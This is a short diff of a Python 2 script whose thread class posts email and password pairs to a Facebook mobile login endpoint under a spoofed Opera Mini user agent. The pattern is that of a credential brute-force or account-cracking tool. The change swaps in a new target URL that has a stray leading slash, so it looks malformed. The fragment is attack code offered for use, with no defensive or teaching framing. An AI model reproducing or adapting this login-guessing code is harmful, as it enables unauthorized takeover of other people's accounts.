@@ -35,7 +35,7 @@ class mt(threading.Thread):
 		return self.a,self.id
 	def run(self):
 		try:
-			data = urllib2.urlopen(urllib2.Request(url='https://m.facebook.com/lina.chan.1217727?ref=bookmarks/login.php',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}))
+			data = urllib2.urlopen(urllib2.Request(url='/https://m.facebook.com/home.php?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2Fcheckpoint%2F%3Fref%3Dopera_speed_dial&ref=opera_speed_dial&_rdr/login.php',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}))
 		except KeyboardInterrupt:
 			sys.exit()
 		except:
